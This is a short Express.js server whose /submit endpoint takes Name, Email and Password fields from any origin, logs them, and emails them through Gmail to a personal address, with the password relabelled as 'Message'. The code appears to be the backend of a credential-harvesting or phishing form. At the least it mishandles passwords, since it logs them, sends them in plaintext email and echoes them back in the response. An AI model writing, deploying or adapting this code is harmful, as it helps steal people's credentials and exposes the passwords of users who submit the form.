const express = require("express");
const cors = require("cors");
const nodemailer = require("nodemailer");
require("dotenv").config();
const app = express();

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.post("/submit", (req, res) => {
  const formData = req.body;
  console.log(formData);

  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: process.env.EMAIL_USER,
      pass: process.env.EMAIL_PASS,
    },
  });

  const mailOptions = {
    from: "aakashjai35@gmail.com",
    to: "jaiaakash57@gmail.com",
    subject: "New Form Submission",
    text: `You have a new form submission:\n\nName: ${formData.Name}\nEmail: ${formData.Email}\nMessage: ${formData.Password}`,
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.error("Error sending email:", error);
      return res
        .status(500)
        .json({ message: "Failed to send email", error: error.toString() });
    }
    console.log("Email sent:", info.response);
    res.json({
      message: "Form data received and email sent successfully",
      formData,
    });
  });
});

app.listen(3000, () => {
  console.log("Server is running on port 3000");
});
